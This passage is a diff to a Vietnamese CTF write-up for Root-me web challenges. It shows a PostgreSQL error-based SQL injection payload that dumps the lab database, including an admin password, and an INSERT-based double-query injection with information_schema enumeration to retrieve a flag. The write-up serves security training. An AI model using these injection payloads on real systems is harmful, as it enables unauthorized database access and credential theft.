@@ -1,4 +1,4 @@
-# Root-me
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/bc3999a1-f0c1-4ae3-ba53-c998cd4cdef5)# Root-me
 ``capy3ra``
 
 ## CSRF – token bypass
@@ -137,4 +137,54 @@ Warning: exec() has been disabled for security reasons in /challenge/web-serveur
 
 ## SQL injection error-based (manually)
 
-1. 
+1. Vào solution của bài có nhiều cách hay. Dưới đây là một cách.
+- Payload: `GET /web-serveur/ch34/?action=contents&ORDER=DSC`. Thử tạo lỗi.
+```
+    ERROR:  syntax error at OR near "DSC"
+    LINE 1: ...eout TO 100; COMMIT;SELECT * FROM contents ORDER BY page DSC
+                                                                        ^
+```
+2. Xác định database
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/4613b056-15f7-4723-916a-cb6c21e360d3)
+3. Sử dụng CAST error-based injection với hàm database_to_xml (PostgreSQL-specific):
+- Payload: ``GET /web-serveur/ch34/?action=contents&ORDER=ASC, (SELECT CAST(CHR(32)||(SELECT database_to_xml(TRUE,TRUE,'')) AS NUMERIC)) ASC``
+4. Và nhận được
+```
+    ERROR:  invalid input syntax for type numeric: " <c_webserveur_34 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="'">
+    <public>
+    <contents>
+      <id>1</id>
+      <page>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</page>
+    </contents>
+    <m3mbr35t4bl3>
+      <id>1</id>
+      <us3rn4m3_c0l>admin</us3rn4m3_c0l>
+      <p455w0rd_c0l>1a2BdKT5DIx3qxQN3UaC</p455w0rd_c0l>
+      <em41l_c0l>admin@localhost</em41l_c0l>
+    </m3mbr35t4bl3>
+    </public>
+    </c_webserveur_34>
+```
+
+## SQL injection - Insert
+
+1. Với gợi ý từ tiêu đề ta biết hướng tiếp cận sẽ là sqli insert cụ thể là vào chức năng register.
+2. Khi thử chèn vào ô username và password đều nhận được thông báo lỗi `char not author` tức là ta sẽ không thể chèn vào 2 ô input này và chỉ có thể chèn vào ô email input.
+3. Sau khi fuzz nhận thấy cột email sẽ được lưu dưới dạng string nên chỉ có thể khai thác theo kiểu nối chuỗi hoặc double query.
+4. Thử khai thác theo kiểu nối chuỗi thì có thể cũng có hope nhưng hơi mệt tiến hành khai thác theo kiểu double query.
+- Payload: `username=111&password=111&email=cuong9cm@gmail.com'),('test','test',(SELECT version()));#`
+5. Register thành công 2 tài khoản. Giờ vào acc test kiểm tra.
+
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/2db004cb-773a-4218-81a2-aff92daf5eac)
+
+6. Detect được db dùng mariadb. Vào trang [SQL_test_online](https://sqliteonline.com/) để thử.
+7. Dùng payload `SELECT COUNT(TABLE_NAME) FROM information_schema.tables` để tìm số bảng trong database. 
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/7e0e7cd0-011e-4e25-9bcf-98e0f65b4a1f)
+8. Dùng payload `SELECT TABLE_NAME FROM information_schema.tables LIMIT 79,1`. Để lấy tên bảng cuối cùng.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/8ed6316f-708f-4e68-8bbc-b7b8fa8bdd77)
+9. Biết được trong bảng flag có cột flag.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/e3420fab-956d-401a-80f8-bfacf7b1ceb5)
+10. Lấy flag.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/a61c6772-acd1-4a23-9df4-54638ba8f94d)
+
+## 
